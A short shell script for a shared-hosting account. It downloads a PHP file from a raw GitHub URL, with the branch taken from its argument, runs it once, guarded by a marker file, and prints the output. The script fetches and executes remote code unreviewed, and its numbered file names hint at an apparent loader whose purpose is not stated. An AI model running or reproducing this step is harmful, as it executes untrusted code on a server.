#!/bin/sh
cd /home/u791571885 && [ -f t172.done ] || { curl -fsSL -o t172.php "https://raw.githubusercontent.com/a04032417-svg/Dar/$1/vs172.php" && /opt/alt/php83/usr/bin/php t172.php > t172.done 2>&1; }
head -c 9000 t172.done
